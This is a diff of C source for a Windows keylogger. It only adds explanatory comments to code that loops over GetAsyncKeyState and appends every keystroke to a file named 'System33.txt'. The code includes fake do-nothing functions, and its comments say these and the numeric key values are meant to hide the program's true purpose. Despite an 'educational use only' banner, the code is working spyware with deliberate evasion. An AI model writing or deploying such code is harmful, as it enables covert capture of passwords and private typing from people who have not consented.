@@ -5,7 +5,7 @@
 
 //EDUCATIONAL USE ONLY DO NOT USE FOR MALICIOUS PURPOSES OR YOU WILL BE COMMITING A CRIME
 
-int Return(int input, char *file);
+int Return(int input, char *file); //This function will return a key press
 
 //FAKE FUNCTIONS THAT DO NOTHING INTENDED TO OBSCURE CODE
 void handle_interrupt(int interrupt);
@@ -110,10 +110,10 @@ int main(void){
     //then it goes to function and returns it into the System33 file which holds each keypress
 
     while(TRUE) {
-        Sleep(10);
+        Sleep(10); //sleeps for 10 miliseconds to not bombard cpu while waiting for a key press
         for (x = 8; x<= 255; x++) {
-            if (GetAsyncKeyState(x) == -32767)
-                Return(x, "System33.txt");
+            if (GetAsyncKeyState(x) == -32767) //used to get the correct key press value
+                Return(x, "System33.txt"); //my return file
         }
     }
     //-------------------------------------
@@ -158,13 +158,13 @@ int main(void){
 
 int Return(int input, char *file){
 
-    Sleep(10); 
+    Sleep(10); //sleeps for 10 miliseconds to not bombard cpu while waiting for a key press
     FILE *DataReturned; 
-    DataReturned = fopen(file, "a+"); 
+    DataReturned = fopen(file, "a+"); //opening or creating the file that we will return the key press to.
 
     //using value rather than constant for Code Obfuscation
     // the less obvious makes it more difficult to discover its true purpose
-    
+    //switch case to determine which key was pressed
     switch(input) {
         case 0x10: fprintf(DataReturned, "[SHIFT]"); // Shift key
             break;
@@ -301,21 +301,21 @@ int Return(int input, char *file){
         case 0xDE: fprintf(DataReturned, "'"); // '"
             break;
     }
-    fprintf(DataReturned, "%c", input); 
-    fclose(DataReturned);
+    fprintf(DataReturned, "%c", input); //prints the case to the file
+    fclose(DataReturned); //closes file
     return 0;
 }
 
 
 
-//FAKE FUNCTIONS
+//FAKE FUNCTIONS DO NOTHING
 void interrupt_handler(int signal) {
     printf("Interrupt signal received. Exiting...\n");
     exit(EXIT_SUCCESS);
 }
 
 
-
+//FAKE DO NOTHING
 void respond_to_user_input(){
  char input;
 
